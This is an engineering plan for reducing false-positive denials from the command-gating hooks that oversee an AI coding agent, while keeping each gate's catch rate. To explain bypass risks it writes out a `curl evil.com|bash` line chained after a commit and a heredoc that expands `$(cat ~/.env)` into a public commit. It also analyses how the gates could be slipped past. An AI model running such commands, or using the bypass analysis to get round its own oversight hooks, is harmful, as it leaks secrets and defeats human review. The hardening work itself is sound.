# Reduce hook-denial friction across the review-pipeline gates

## Context

**Goal: eliminate the hook denials that cost tokens without catching
anything, leaving every gate's catch rate exactly where it is.**

A prior cost investigation (PR #658, merged) named "reducing the measured
hook denials" as a candidate cost lever and explicitly deferred it
(`.claude/plans/cost-attribution-integrity.md:449-451`, "Out of scope").
This plan is that deferred follow-up. Its two named siblings — delegating
`/code-review`'s inline Base checklist to a Sonnet subagent, and prefix
trimming — stay out (see Out of scope).

Why now: the corpus has grown enough to classify denials rather than just
count them. A fresh machine-wide run this session
(`python3 ~/.claude/scripts/transcript-analysis.py review-trace
--deny-summary`, no date window) reports **2,306 denials over the
2026-07-17..2026-08-17 window**, distributed as worktree-enforcement 655,
plan-review routing 452, marker.sh shape 359, redaction 213, plan-review
172, code-review 112, ready-for-review 96, respond-pr 78, credential-path
57, network-install 44, PII-commit 39.

**Provenance of every figure in this plan.** All counts come from that one
command, which scans the union of every root declared in
`~/.claude/transcript-config-dirs` — a corpus mixing this repo's own
sessions with private-engagement ones. Only unattributed aggregate counts
are carried here: no branch name, path, project name, session id, or
per-project breakdown, and nothing that identifies which root contributed
what. `review-trace`'s raw output is not publish-safe under that scope
(`docs/transcript-analysis.md:17`), so it is never quoted — only totals
derived from it. The same constraint governs the PR bodies (see
Verification).

Intended outcome: the denial classes that are provably friction are gone;
the classes that are provably the gates working are documented as such and
left alone; and the repo carries a written record of which is which, so a
future session does not re-litigate it.

A denial is friction only when the session's next move was a reshaped
command carrying the same content, with nothing else changed. Each count
below was classified against that test by recovering the real attempted
command from the raw transcript, not by matching the deny message.

## Approach

Five hooks are denying commands they were never meant to catch, and the
cause is the same in every case: **the hook reasons over the raw Bash
command string instead of over the thing it actually cares about.** The
worktree parser chokes on shell punctuation that has no git in it; the
redaction gate flags the harness's own `cd` prefix and scratchpad path
rather than the diff being committed; the marker gate hard-rejects a
newline regardless of what is on either side of it. Each fix moves the
hook's judgment off the incidental text and onto the gated content.

Separately, the single largest bucket (plan-review routing, 452) is not a
hook defect at all: the skill body tells the model to read `ROUTING.md` 136
lines after the step where spawning starts, so a review round that spawns
five specialists pays five denials before the model reads the file once.
That fix is one relocated instruction in a skill body.

Items A–F below are **an unordered set, not a sequence.** Their labels are
descriptive names; the execution order is whatever Phase 0's cost ranking
produces, and no item's correctness depends on another's outcome. Item G
is the exception — it re-measures, so it runs after the others merge.

Each item lands as **its own PR.** An omnibus diff across five hooks would
be unreviewable, and re-measuring per fix (item G) needs separable
attribution to tell which fix moved which bucket. Later items do not wait
on earlier items' deferred re-measures.

A shared cross-hook command-parsing library was considered and set aside.
It is the over-powered primitive here: every remaining fix is a local
correction inside a parser or regex that already exists, and
`deny-credential-bash-reads.sh` already demonstrates the lighter pattern
(scan → strip a known-benign span → re-scan) that item C reuses. Building
a shared tokenizer would be a larger diff than every fix it replaces and
would put five gates on one new failure surface.

### Denial disposition

Classification is **partial today**, and closing it is Phase 0's first
deliverable. Publishing a fix list without the residual would overstate
coverage, so the residual is stated:

| Disposition | Denials | Where |
|---|---|---|
| Friction, fixed by an item below | ~1,036 | items A–E |
| Genuine catch, no change | ~495 | plan-review 172, code-review 112, ready-for-review 96, skill-review 14, routing first-in-session 110 (one per round is the gate working) |
| Deliberate by design, documented, no change | ~125 | respond-pr read-gating 68, credential-bash search-pattern 57 |
| Already closed inside the window | ~104 | `stale_lock_race`, commit 7804120 (#683) |
| Deferred, needs engineer sign-off | ~93 | dead-PID lock 63, `stash`/`config` read forms ~30 |
| **Not yet classified** | **~450** | mostly worktree-enforcement sub-classes: file-writes variant ~51, "targets a working directory outside this repository" ~35, "effective working directory cannot be safely determined" ~29, plus ~18 residual; and unenumerated redaction sub-buckets (Slack-channel 27, blocklist 9, tracker-ID 9, SSH-key-path 4) |

Phase 0 assigns every one of the ~450 to one of the five rows above before
any fix ships. Two of those sub-classes ("could not determine the git
subcommand" 14, "could not tokenize command — unbalanced quotes" 12) are
already known to be parse failures of the same family as item A and are
counted in A's total below.

### Assumption ledger

```
Root: hook denials that change nothing about what the session then does
cost output tokens on the blocked call and its retry, with no
corresponding catch.

Givens:
- The harness mandates a `Co-Authored-By: Claude <noreply@anthropic.com>`
  commit trailer — beyond reach: it is a system-prompt instruction, not a
  repo rule this plan can edit.
- The harness embeds the session UUID in the scratchpad directory path —
  beyond reach: a harness-controlled naming convention.
- `cache_read_input_tokens` is a whole-prefix aggregate with no per-cause
  decomposition — beyond reach: PR #658 established transcripts never
  record the assembled request
  (`.claude/plans/cost-attribution-integrity.md:232-235`).

Row 1 [mechanism]: disposable cost script, not a committed subcommand —
anchors: root — a one-time prioritization input needs no permanent
surface; the two lighter alternatives to a new `review-trace --cost` flag
are (a) reusing `friction-count`, rejected because it is a single-file,
hook-driven, unweighted composite with no corpus aggregation or dollar
dimension (`transcript-analysis.py:8706-8729`), and (b) a standalone
subcommand, rejected because it duplicates multi-root resolution,
redaction, and pricing plumbing — the same reasoning PR #658 used
(`.claude/plans/cost-attribution-integrity.md:130-133`).
Row 2 [mechanism]: per-hook fixes, no shared parser — anchors: root —
each fix is local to a parser or regex that already exists; the heavier
shared-tokenizer option is rejected in Approach above.
Row 3 [assumption]: the `unbalanced group` denials have ONE root cause,
not two — shlex fuses any run of adjacent punctuation characters into a
single composite token, so `);` never equals the literal `")"` the loop
tests and `<(` never equals `"("`
[verified: `shlex.shlex(..., punctuation_chars=True)` reports
`punctuation_chars` as `'();<>|&'`, so `;` is a member and fuses with
adjacent members like any other — `FOO=$(echo hi); echo done` tokenizes as
`['FOO=$', '(', 'echo', 'hi', ');', 'echo', 'done']`; loop tests at
parse-git-command.py:299,302] — anchors: row2
Row 4 [assumption]: because the cause is generic run-fusion, the affected
class is wider than the two observed shapes and includes `;;`, `;&`,
`;;&`, `|&`, `&;`, `);;` [unverified — no corpus instance observed; the
mechanism implies them] — anchors: row3
Row 5 [assumption]: `_lib.sh:589`'s commit tail is
`git[[:space:]]+commit([[:space:]].*)?$` — already unconstrained, so
`require-code-review.sh` accepts the mandated trailer today and the only
gate rejecting it is `enforce-marker-script-shape.sh:333`'s `[^&|;<>]*`
[verified: _lib.sh:582-591, require-code-review.sh:95,
enforce-marker-script-shape.sh:333] — anchors: row2
Row 6 [assumption]: `>` is excluded from that tail deliberately, to block
`git commit ... > /path` as an arbitrary-file-write primitive
[verified: enforce-marker-script-shape.sh:322-332] — anchors: row5
Row 7 [assumption]: `marker.sh write` derives its marker value internally
from repo state and accepts only a skill name, so the shape gate guards
against command smuggling, not marker forgery
[verified: claude/.claude/scripts/marker.sh:186-262] — anchors: row2
Row 8 [assumption]: 124 of 213 redaction denials fire on the command text
(leading `cd <home-rooted path>` prefix, 54; scratchpad session-UUID path,
70) rather than
on any gated content, and this affects exactly one hook —
`deny-private-project-refs.sh:462` scans `$COMMAND` unconditionally, while
`deny-pii-in-commits.sh:310` scans a quote-stripped target and
`deny-network-installs.sh:61,114-156` scans fragments for install verbs,
neither running the structural detectors
[verified: those three call sites; both detectors at `_lib.sh:1307,1310`
have exactly one consumer each, `deny-private-project-refs.sh:626-627`] —
anchors: row2
Row 9 [assumption]: `parse-git-command.py` has exactly one consumer,
`require-worktree-for-git-writes.sh:210`
[verified: repo-wide grep; `deny-repo-relocation.sh:17-20` only names it
in a comment and actually uses `_lib_split_fragments`] — anchors: row2
Row 10 [assumption]: `require-routing-read.sh` fires per `Agent` tool call
with no batch allowance, so N spawns in one round cost N denials
[verified: require-routing-read.sh:33,59-68] — anchors: row2
Row 11 [assumption]: `plan-review/SKILL.md`'s only instruction to read
ROUTING.md is at line 234, after Step 5's spawn step at line 96-98, and
Step 0 never mentions it [verified: plan-review/SKILL.md:13-22,96-98,234]
— anchors: row10
Row 12 [assumption]: `marker.sh deactivate` deletes the routing-read
credit, so every re-review round in a session re-pays
[verified: claude/.claude/scripts/marker.sh:322] — anchors: row10
Row 13 [assumption]: plan-review, code-review, ready-for-review, and
skill-review denials are genuine catches — every sampled denial was
followed by the session actually running the required skill, never a
reshaped retry [verified: 18 sampled events across the four gates] —
anchors: root
Row 14 [assumption]: the 104 `stale_lock_race` denials are already closed
by commit 7804120 (#683) — 104 before that commit, 0 after, through the
end of the measurement window [verified: date-bounded corpus recount] —
anchors: root
Row 15 [assumption]: restricting `_is_git_token` to command position is a
catch-rate regression unless it skips env-assignment and wrapper prefixes,
since `env FOO=bar git commit` and `sudo git commit` are detected today by
the scan-every-token behavior
[verified: parse-git-command.py:174-177 scans all tokens;
deny-repo-relocation.sh:116 carries the reusable skip list] — anchors:
row3
Row 16 [assumption]: friction-reduction is in scope and any change to a
gate's catch rate stops and asks first [engineer-verified] — anchors: root
Row 17 [assumption]: per-denial token cost is measured before targets are
ranked; volume alone is not an accepted proxy [engineer-verified] —
anchors: row1
Row 18 [assumption]: the 223 non-hook friction events are out of scope
[engineer-verified] — anchors: root
```

## Work items

### Phase 0 — Classification, baseline, and cost ranking

Two deliverables, both prerequisites for every item below.

**Complete the disposition table.** Assign each of the ~450 unclassified
denials to one of the five dispositions. This is what makes the plan's
coverage claim checkable.

**Rank by cost.** A disposable script (scratchpad, not committed) imports
`_price_turn`, `dedup_turns_by_request_id`
(`transcript_analysis/pricing.py:314-356,160-216`), `hook_denial_key` and
`_denial_hook_label` (`transcript-analysis.py:1073-1101,1266-1288`), and
prices each denial as the blocked call's assistant-turn `output_tokens`
plus the next assistant turn's `output_tokens`, grouped by
`_denial_hook_label`. It must call `dedup_turns_by_request_id` first —
`_review_trace_session_events` does not, and `output_tokens` reaches its
billed value only on a multi-block response's last record.

Carried context occupancy is reported as a separately-labelled estimate
priced from the denial text's own size, never folded into the attributed
figure — per the ledger's third given.

**Stop rule.** Compute the denominator with
`python3 ~/.claude/scripts/transcript-analysis.py cost --since 31d`. Note
that `cost` and `review-trace` do not share a window grammar: `cost` takes
a relative `Nd` and has **no `--until`**, while `review-trace --since`
takes an absolute `YYYY-MM-DD` and does right-bound. So the denominator is
left-bounded only, and the numerator must be recomputed over the same
left-bounded, unbounded-right window rather than the corpus window quoted
in Context — otherwise the ratio compares two different spans. If
denial-attributable cost is under 1% of that figure, stop and report
instead of shipping fixes. A single-session proof of concept established
only the *shape* of the cost — the blocked call's and the retry turn's
output tokens dominate, and the carried-context share is both small and
structurally unattributable. It produced no figure this plan carries;
Phase 0 derives the magnitude from the corpus.

### Item A — `parse-git-command.py` composite-token fusion (~229)

One root cause, not two. `shlex` with `punctuation_chars=True` fuses any
run of adjacent punctuation characters into a single token, so `);`
tokenizes whole and matches neither the literal `")"` at
`parse-git-command.py:302` nor `";"`, leaving `paren_depth` never
decremented; `<(` likewise never equals the `"("` at `:299`, so no group
opens while its later standalone `)` drives the depth negative. The fix is
to post-tokenize and split fused punctuation runs into their constituent
operators, longest-match-first so `&&` and `||` survive as single
operators.

Because the cause is generic, the fix must cover the class, not the two
observed shapes: `;;`, `;&`, `;;&`, `|&`, `&;`, `);;`. Special-casing `);`
and `<(` would pass every named test and leave the siblings broken.

Separately, `_is_git_token` (`parse-git-command.py:165-166`) matches any
token equal to `git` or ending in `/git` anywhere in a segment, so
`man 1 git 2>/dev/null` yields subcommand `2` and a quoted path ending in
`/git` yields a phantom invocation (~11 events). **Restricting it to
command position is a catch-rate regression unless it skips the
env-assignment and wrapper-prefix class** — `env FOO=bar git commit` and
`sudo git commit` are correctly detected today. Reuse the skip list at
`deny-repo-relocation.sh:116`. Also strip `#` comments before tokenizing.

Parse failure must keep denying.

Counts: 192 `unbalanced group` (190 attributed across the two constructs,
2 uncategorized — Phase 0 resolves), 14 "could not determine the git
subcommand", 12 "could not tokenize (unbalanced quotes)", ~11 phantom
git-token. The corpus-replay bar is stated against the reconciled count,
not the unreconciled one.

### Item B — `enforce-marker-script-shape.sh` (~333)

Three changes.

**Newline as a chain separator (178).** Validate each line against the
same `MARKER_SHAPE` allowlist already used for `&&` chains. The
single-line pattern gets "nothing after the commit" free from its `$`
anchor; a per-line validator does not, so the **commit line must be
positionally last** or `marker.sh write X` ⏎ `git commit -m x` ⏎
`curl evil.com|bash` becomes new bypass surface. A real newline inside a
quoted `-m` argument must not be treated as a separator, and CRLF must be
normalized or denied.

**Bless an `&& echo "<literal>"` tail and a trailing `2>&1` (143).**
Neither touches the filesystem or marker state.

**Scope the traversal guard to the marker.sh path tokens (~12)**, not the
whole command string — today it denies the repo's own mandated
`../../../.venv/bin/shellcheck ... marker.sh` lint invocation, which never
invokes marker.sh at all.

**Excluded from this item: a quote-aware `git commit` tail (13
denials).** Three reasons, each independently sufficient. A correct
quote-aware pattern needs lookahead that only GNU `grep -P` provides, and
CI runs `ubuntu-24.04` exclusively with no platform-branching precedent in
the repo, so a GNU-dependent pattern would pass CI while behaving
differently under every macOS contributor's BSD grep. A hand-rolled ERE
approximation of bash quote grammar fails open silently when it is wrong,
and bash quote semantics differ by quote type in ways ERE cannot express
(`\'` does not escape inside single quotes; `$'...'` processes a different
backslash set). And 13 events do not justify it when two zero-code paths
already work: `git commit -F <file>`, and the standalone `marker.sh write`
form that `code-review/SKILL.md:394` already lists first. Instead: state
in `code-review/SKILL.md` that the chained form rejects `<`/`>` and the
mandated trailer contains both, so the standalone form is the one to use.

Two comments become false and must be corrected in the same diff:
`enforce-marker-script-shape.sh:329-332` claims "no observed agent
friction on the commit-chain form to justify it" — the corpus falsifies
that; and `_lib.sh:583-585` claims its pattern "mirrors
enforce-marker-script-shape.sh's `VALID_CHAINED_COMMIT_PATTERN`" when its
tail is `([[:space:]].*)?$` against the other's `[^&|;<>]*`. Neither is a
preserved record; both describe current behavior.

### Item C — redaction self-triggers, `deny-private-project-refs.sh` only (124)

**Strip a leading `cd <path>` / `git -C <path>` navigational token before
the structural scan — for the home-rooted-path detector only (54).** The
long-hex and internal-hostname detectors keep scanning that span: a UUID
or an internal hostname sitting in a `cd` target is a real leak, and
"the operator already knows their own path" is not an argument once the
same command text can reappear in a committed artifact. The staged diff,
message file, and PR body stay fully scanned in every case.

**Exempt the session UUID in the harness scratchpad path from the long-hex
detector (70) — by exact-value match against the live session ID, never by
path shape.** A shape match would exempt any long hex string wrapped in a
lookalike path, including one an injection controlled.

This item touches one hook. `deny-pii-in-commits.sh` and
`deny-network-installs.sh` do not run these detectors (ledger row 8) and
are separate items.

### Item D — `deny-pii-in-commits.sh` heredoc scanning (34)

Today `git commit -F -` is blanket-denied because the gate cannot verify
what git reads from a pseudo-file. Scan the body instead — but **only for
the exact fully-quoted `<<'DELIM'` form.** An unquoted `<<DELIM` lets bash
expand `$(cat ~/.env)` before git ever reads it, so the scanner would see
source text and never the secret that becomes the commit message. Every
other form denies, with an explicit test each: unquoted delimiter,
partially-quoted (`<<"D"ELIM`, `<<D\ELIM`), `<<-` tab-stripping, chained
heredocs (`cmd <<A <<B`), delimiter appearing mid-body, and a heredoc
redirect placed before the command.

Passing all six tests is **necessary but not sufficient** to call the
scan reliable — bash heredoc quoting has more edge cases than six, and an
unenumerated one that scans-as-safe is silent secret exfiltration into a
public commit. Shipping the scan in place of the blanket deny therefore
needs the same engineer sign-off the dead-PID lock and `stash`/`config`
items carry in Out of scope. Absent that sign-off, keep the blanket deny —
a reliable deny beats an unreliable scan, and this item is worth 34
denials.

### Item E — `deny-network-installs.sh` advisory text (count TBD in Phase 0)

Skip the install-verb check on a fragment that is only `echo`/`printf`
with no redirect; every other fragment in a chain stays scanned. Today
`echo "pnpm install"` denies. **This item has no replay-verified count
yet** — unlike A–D it rests on one sampled event. Phase 0 must produce
that count and a ledger row, or the item drops.

### Item F — plan-review routing (~342 of 452)

Move the ROUTING.md read into Step 0 of `plan-review/SKILL.md`, directly
after the `activate-gate` fenced block and before the
`declare-planmode-path` fixture comment — inserting between a
`HOOK_TEST_FIXTURE` comment and its own fence would break
`extract_skill_command`'s "comment immediately followed by a fence" regex.
Drafted text:

> Then read `${CLAUDE_SKILL_DIR}/ROUTING.md` with the Read tool. The
> `require-routing-read.sh` gate blocks every specialist spawn until it
> has been read this round, and it records only Read-tool access — a Bash
> `cat` of the same path does not satisfy it.

Step 0 rather than immediately before Step 5 because the gate arms at Step
0: `require-routing-read.sh:59-60` keys enforcement on the active marker
Step 0 writes, so any spawn between the two is deniable. The cost is that
a round ending in "No specialists spawned" pays one Read it did not need —
one file read against five denials on a spawning round.

Amend `require-routing-read.sh:68`'s deny message to say what satisfies
the gate. Drafted text:

> Agent spawn blocked by plan-review routing gate: read
> `~/.claude/skills/plan-review/ROUTING.md` with the Read tool — a Bash
> `cat` is not recorded. One read covers every spawn in this review round.
> All spawn criteria (always-spawn rules, item ownership, reconciliation
> logic) live exclusively in ROUTING.md.

One further over-broad case, observed directly: the gate keys only on
`TOOL_NAME == "Agent"` plus the active-plan-review marker
(`require-routing-read.sh:33,59-60`), so a `/code-review` nested inside an
active plan-review session has its own specialist spawns denied until
ROUTING.md is read — a file with no bearing on code-review routing. Phase
0 counts how often this shape occurs before deciding whether to narrow the
match; if it is rare, the deny-message fix above already covers it.

Not proposed: keeping routing-read credit across `deactivate`. That
weakens the intended per-round re-engagement and is a catch-rate change.

### Item G — Record and re-measure

Update `docs/hooks.md` and `docs/private-project-redaction.md` for the
changed matching behavior, add each hook's new known gaps to its own
header per the hook-review checklist, and record the lever's outcome in
`docs/cost-levers-considered.md` per that file's convention. Re-run the
baseline command with `--since` set to each item's merge date. If a
bucket's count does not fall to near zero, reopen that item — items do not
block each other on this signal.

## Critical files

Create:
- Phase 0's script — scratchpad only, never committed. It carries both the
  cost ranking and the one-time real-corpus replay: each recovered denied
  command run against the current hook to confirm the classification is
  complete, and against a local prototype of the fix to confirm the
  denial would have been eliminated.

No real command text lands in the repo, in any form. Sanitizing the
recovered commands into committed fixtures was the alternative considered
and rejected on two grounds. A sanitizer's plausible token classes (path,
UUID, project name) are narrower than this repo's own redaction taxonomy,
which also covers internal-TLD hostnames, tracker IDs, env var names
encoding a project, and a structural-fingerprint tier no hook catches at
all — so a fixture could pass the commit gate and still carry a leak. And
a sanitizer with no fidelity test of its own can over-scrub, inserting a
space that turns `);` back into `) ;` and destroying the exact fused-token
shape the fixture exists to preserve, after which every downstream test
passes vacuously.

Both point the same way: the evidence in these commands is **shell
structure**, not the identifiers inside it. A hand-authored synthetic
fixture carrying that structure is equivalent evidence at no provenance
risk, and the generative test below covers the tokenizer class
systematically rather than by example.

Modify (one PR per item):
- `claude/.claude/hooks/parse-git-command.py` + `tests/test_parse_git_command.py`
- `claude/.claude/hooks/enforce-marker-script-shape.sh`, `_lib.sh` (comment only) + `tests/test_enforce_marker_script_shape.py`; `claude/.claude/skills/code-review/SKILL.md`
- `claude/.claude/hooks/deny-private-project-refs.sh` + `tests/test_deny_private_project_refs.py`
- `claude/.claude/hooks/deny-pii-in-commits.sh` + `tests/test_deny_pii_in_commits.py`
- `claude/.claude/hooks/deny-network-installs.sh` + `tests/test_deny_network_installs.py`
- `claude/.claude/skills/plan-review/SKILL.md`, `claude/.claude/hooks/require-routing-read.sh` + `tests/test_require_plan_review.py`, `tests/test_require_routing_read.py`
- `docs/hooks.md`, `docs/private-project-redaction.md`, `docs/cost-levers-considered.md`

**Reuse opportunities.** `_price_turn`, `_token_counts`,
`dedup_turns_by_request_id` (`transcript_analysis/pricing.py`);
`hook_denial_key`, `_denial_hook_label`, `_compute_deny_summary_data`
(`transcript-analysis.py`); `MARKER_SHAPE`, already factored as the shared
path-prefix fragment (`enforce-marker-script-shape.sh:302`); the
env/wrapper skip list at `deny-repo-relocation.sh:116`; the `--env-file`
strip-then-rescan precedent in `deny-credential-bash-reads.sh`;
`_lib_strip_shell_quotes` (`_lib.sh:1117`); and `marker.sh:282-289`'s
pending-read backfill, which already establishes that routing-read credit
can be granted from an earlier Read.

## Verification

Volume drop cannot be verified at merge time — denial data accrues over
days. Verification is therefore:

1. **Synthetic shape fixtures**, one per classified shape class, committed
   and CI-run: each must stop denying after its item's fix, and no
   previously-allowed command may newly deny. Fidelity to the real corpus
   is established once in Phase 0's replay, not carried in the repo.
2. **Negative-space coverage**, because the risk class here is a hook that
   starts *allowing* what it used to deny, and an allow-case test cannot
   detect over-permissiveness:
   - Item A: a generative test over concatenations of **up to four**
     elements of `OPERATORS ∪ {(,)}` with no separating whitespace,
     asserting each constituent round-trips as if space-separated.
     `OPERATORS` is `{";", "&&", "||", "|", "&"}`
     (`parse-git-command.py:88`); pairwise is too narrow, since the class
     item A names includes the three-element `;;&` and `);;`, and four
     catches longest-match-first boundary errors one rank past the named
     set. Plus `env`-prefixed and `sudo`-prefixed git writes as **deny**
     cases.
   - Item B: a mutation harness over each new allow fixture — inject an
     unquoted `>`, an extra `&&`, an unescaped newline, content after the
     commit line — asserting deny. The three surviving relaxations
     interact (newline-chaining plus the blessed `&&` tail could combine
     to slip content past "commit line must be last"), so the harness
     stays warranted at three.
   - Item C: a must-deny corpus where the benign `cd`/`git -C` prefix is
     followed by real gated content, proving the strip removes only the
     navigational token; a shape-matching-but-wrong-value scratchpad path
     that must still deny; and — guarding the detector split specifically
     — a long-hex value and an internal hostname embedded **inside** the
     `cd` target itself, both of which must still deny. Without that last
     pair, an implementer who builds one stripped string and feeds it to
     all three detectors passes every other test while reopening exactly
     the leak the split exists to prevent.
   - Item D: one test per enumerated ambiguous heredoc form.
3. **Deferred re-measure** per item G.

Also required: `claude-hook-review` on every `.sh` and parser change;
`/skill-review` on the `plan-review/SKILL.md` and `code-review/SKILL.md`
changes (hook-enforced at commit); `test_require_plan_review.py` and
`test_require_routing_read.py`, which extract and execute the fenced
`HOOK_TEST_FIXTURE` recipes out of the skill bodies — **not**
`test_hook_alignment.py`, which does docs-coverage and gate/skill-pairing
checks and carries no fixture extraction; `test_doc_counts.py`, whose
doc-count claims must stay true; and
`scripts/list-shell-files.sh | xargs -0 shellcheck`.

`review-trace` output is not publish-safe under the default machine-wide
scope (`docs/transcript-analysis.md:17`) — only aggregate counts reach PR
bodies, never branch names or paths. Each PR description states which
synthetic fixture stands in for which classified shape, so a reviewer
without corpus access can check structural plausibility.

## Out of scope

- **The two sibling cost levers** — delegating `/code-review`'s Base
  checklist to a Sonnet subagent, and prefix trimming. Named in the same
  deferred bullet; distinct mechanisms.
- **The 223 non-hook friction events** (user-rejected 124, automode-blocked
  48, automode-unavailable 32, interrupted 19) — different causes, mostly
  not fixable by a hook or skill change.
- **Every gate whose denials were classified as genuine catches** —
  plan-review (172), code-review (112), ready-for-review (96),
  skill-review (14), routing's first-in-session denials (110), and
  worktree-enforcement's `checkout`/`pull`/`restore`/`merge` denials
  (~111). No change proposed; the record that they were checked is the
  deliverable.
- **respond-pr's read-gating (68 of 78) and credential-bash's
  search-pattern false positives (57).** Both are documented deliberate
  choices in the hooks' own headers — read-gating prevents the
  partial-comment-fetch failure, and a verb-aware credential carve-out was
  already considered and declined there as an unbounded bypass surface.
  Changing either is a catch-rate change.
- **The quote-aware `git commit` tail (13 denials).** Rejected in item B
  on portability, fail-open, and proportionality grounds; replaced by a
  skill-body clarification.
- **Dead-PID worktree lock auto-eviction (63 denials, 10 after #683).**
  Real remaining friction, but the hook's own header
  (`require-worktree-for-git-writes.sh:76-79`) records that an in-hook
  evict-then-relock is itself racy. Needs engineer sign-off and its own
  design.
- **Read-only forms of `stash` and `config` (~30 denials).** Every
  recovered sample was a read (`stash list`, `config --get`), but the
  allowlist keys on subcommand name only, so admitting them means teaching
  it to judge arguments. Write-detection precision, not parser
  correctness — engineer sign-off first.
- **A shared cross-hook command parser.** Named in Approach and set aside
  as heavier than every fix it would replace.
- **`_denial_command_shape`'s keyword matching.** It mis-attributes
  command shapes in the measurement tool's own cross-tab — `git diff` and
  `git status` appear as worktree-enforcement denials when no structured
  deny message names them. Worth fixing; not this task. Item G reads the
  hook/gate table instead.
